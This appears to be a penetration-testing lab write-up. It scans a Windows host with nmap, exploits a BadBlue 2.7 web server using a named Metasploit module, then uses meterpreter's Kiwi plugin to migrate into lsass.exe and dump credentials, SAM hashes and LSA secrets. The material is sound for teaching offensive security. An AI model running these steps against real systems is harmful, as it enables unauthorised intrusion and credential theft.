
A Kali GUI machine and a target machine running vulnerable application are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the machine using the appropriate Metasploit module. Then, use the meterpreter Kiwi plugin to extract sensitive data from the target's machine.

Objective: Exploit the application and find all the flags.

- Find Administrator and Student users NTLM hash.
- Dump LSA secrets to find Syskey

Instructions:* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. * The IP address of the target machine is mentioned in the file “/root/Desktop/target” * Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

## Lab Windows: Meterpreter: Kiwi Extension


```
nmap -sS -sV -p- 10.4.25.247

PORT      STATE SERVICE       VERSION
80/tcp    open  http          BadBlue httpd 2.7
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
```


```
search badblue
msfconsole 
use exploit/windows/http/badblue_passthru
set rhosts 10.4.25.247
exploit
```

```
migrate -N lsass.exe
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```